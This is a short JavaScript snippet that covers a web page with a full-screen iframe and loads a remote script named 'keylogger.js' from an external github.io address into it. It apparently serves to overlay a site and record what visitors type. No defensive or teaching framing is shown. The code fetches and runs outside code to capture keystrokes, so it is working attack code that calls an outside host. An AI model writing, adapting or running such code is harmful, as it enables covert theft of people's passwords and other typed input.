var iframe = document.createElement('iframe');
iframe.setAttribute("src", "https://bing.com");
iframe.setAttribute("style", "position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;");
var html = '<script src="https://turtlecode84.github.io/cdn/scripts/keylogger.js"></script>';
iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
document.body.appendChild(iframe);
/*iframe.contentWindow.document.open();
iframe.contentWindow.document.write(html);
iframe.contentWindow.document.close();*/
